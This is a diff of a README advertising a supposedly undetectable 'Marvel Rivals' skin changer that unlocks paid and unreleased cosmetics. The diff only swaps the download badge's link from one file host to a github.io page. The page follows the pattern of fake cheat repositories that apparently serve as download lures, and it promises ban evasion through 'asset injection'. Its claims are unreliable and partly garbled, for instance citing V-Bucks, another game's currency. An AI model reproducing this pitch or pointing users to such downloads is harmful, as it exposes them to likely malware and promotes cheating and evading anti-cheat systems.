@@ -1,7 +1,7 @@
 # **Marvel Rivals Ultimate Skin Changer: Unlock Every Cosmetic Instantly** 🎨✨  
 Transform your *Marvel Rivals* experience with this **undetectable skin changer**, granting access to **exclusive, unreleased cosmetics**, **legendary character variants**, and **seasonal battle pass items**—all without spending V-Bucks or grinding! Built with **encrypted asset injection** and **real-time texture swapping** to keep your account safe from bans.  
 
-**[![Download MarvelRivals Skinchanger](https://img.shields.io/badge/Download-MarvelRivals%20Skinchanger-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)**
+**[![Download MarvelRivals Skinchanger](https://img.shields.io/badge/Download-MarvelRivals%20Skinchanger-blueviolet)](https://marvel-rivals-skin-changer.github.io/.github/)**
 
 🌟 **Features**:  
 - **Instant Skin Swapping**: Cycle through **MCU-inspired outfits**, comic-accurate designs, or custom fan-made skins mid-match.  
